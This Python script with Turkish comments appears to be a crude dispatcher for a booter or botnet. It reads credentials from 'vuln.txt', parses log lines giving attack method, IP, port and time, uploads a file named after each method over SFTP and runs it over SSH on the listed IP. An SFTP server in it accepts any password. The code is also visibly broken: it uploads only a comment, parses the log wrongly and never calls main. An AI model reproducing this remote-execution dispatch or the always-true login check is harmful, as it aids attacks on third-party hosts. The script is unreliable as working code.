import http.server
import socketserver
import paramiko
import threading
import os
import time

port = 5385
sftp_port = 22
Handler = http.server.SimpleHTTPRequestHandler
sftp_directory = "/path/to/sftp_directory"

class SFTPServer(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()

    def check_channel_request(self, kind, chanid):
        if kind == "session":
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username, password):
        return paramiko.AUTH_SUCCESSFUL

def sftp_connect(ip_address, username, password):
    try:
        transport = paramiko.Transport((ip_address, 22))
        transport.connect(username=username, password=password)
        sftp = paramiko.SFTPClient.from_transport(transport)
        print("SFTP connection successful.")
        return sftp
    except Exception as e:
        print(f"Error: {e}")
        return None

def read_sftp_credentials_from_file(file_path):
    try:
        with open(file_path, 'r') as file:
            lines = file.readlines()
            ip_address = lines[0].strip()
            username = lines[1].strip()
            password = lines[2].strip()
            return ip_address, username, password
    except Exception as e:
        print(f"Error reading credentials from file: {e}")
        return None, None, None

def start_sftp_server():
    try:
        host_key = paramiko.RSAKey(filename="path/to/your/private/key")
        transport = paramiko.Transport(("localhost", sftp_port))
        transport.add_server_key(host_key)

        server = SFTPServer()
        transport.start_server(server=server)

        print(f"SFTP server started on localhost:{sftp_port}.")
        transport.accept(1)  

    except Exception as e:
        print(f"Error starting SFTP server: {e}")

def main():
    credentials_file_path = 'vuln.txt'
    ip_address, username, password = read_sftp_credentials_from_file(credentials_file_path)

    if ip_address and username and password:
        sftp = sftp_connect(ip_address, username, password)

        if sftp:
            try:
                remote_path = '/remote/path/to/'
                local_path = 'file.py'

                # Hype_Logs.log'u oku ve değişiklikleri kontrol et
                with open('Hype_Logs.log', 'r') as log_file:
                    lines = log_file.readlines()
                    for line in lines:
                        if '!' in line:
                            # Dosya içeriği User | ! Method ip port zaman şeklinde olacak.
                            _, _, method, ip, port, zaman = line.split('|')
                            
                            # Dosyayı oluştur ve içeriğini belirli bir Method + .py uzantısı ile doldur
                            with open(local_path, 'w') as py_file:
                                py_file.write(f"# Method: {method}\n")
                            
                            # SFTP aracılığıyla dosyayı sunucuya gönder
                            sftp.put(local_path, f"{remote_path}{method}.py")
                            
                            # SSH ile sunucuya bağlan ve belirli bir komutu çalıştır
                            ssh = paramiko.SSHClient()
                            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                            ssh.connect(ip, username=username, password=password)
                            command = f"python {remote_path}{method}.py"
                            stdin, stdout, stderr = ssh.exec_command(command)
                            print(f"Command executed on {ip} with result: {stdout.read().decode()}")
                            ssh.close()
                            time.sleep(1)  # İşlemleri ayırmak için biraz bekle
                            
                print("Operations completed.")
                
            except Exception as e:
                print(f"Error: {e}")
            finally:
                sftp.close()

if __name__ == "__main__":
    with socketserver.TCPServer(("", port), Handler) as httpd:
        print(f"HTTP server started on port {port}...")

        start_sftp_server()

        while True:
            print("Waiting for connection...")
            client, address = httpd.get_request()
            print(f"Connection from: {address}")

            try:
                t = paramiko.Transport(client)
                t.start_server()

                print("File received and executed.")
            except Exception as e:
                print(f"Error: {e}")
            finally:
                client.close()
